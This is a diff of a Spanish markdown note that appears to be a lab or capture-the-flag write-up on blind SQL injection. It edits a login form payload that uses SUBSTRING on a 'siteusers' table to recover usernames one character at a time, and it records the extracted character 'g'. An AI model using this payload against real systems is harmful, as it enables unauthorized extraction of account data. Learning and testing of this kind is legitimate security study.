@@ -84,11 +84,8 @@ ejecutamos el ataque cambiando la posición, en este caso nos da la letra "i"
 tenemos que hacer esto hasta sacar el nombre de la tabla
 
 ```python
-	username= +#&password=kitty
+	username=kitty'+AND+SUBSTRING((SELECT+username+from+siteusers+LIMIT+0,1),1,1)="a"+#&password=kitty
 ```
 
-```python
-kitty'+AND+SUBSTRING((SELECT+username+from+siteusers+LIMIT+0,1),1,1)="a"
-```
-
+sacamos el primer carácter "g"
 ![[Pasted image 20240205001529.png]]
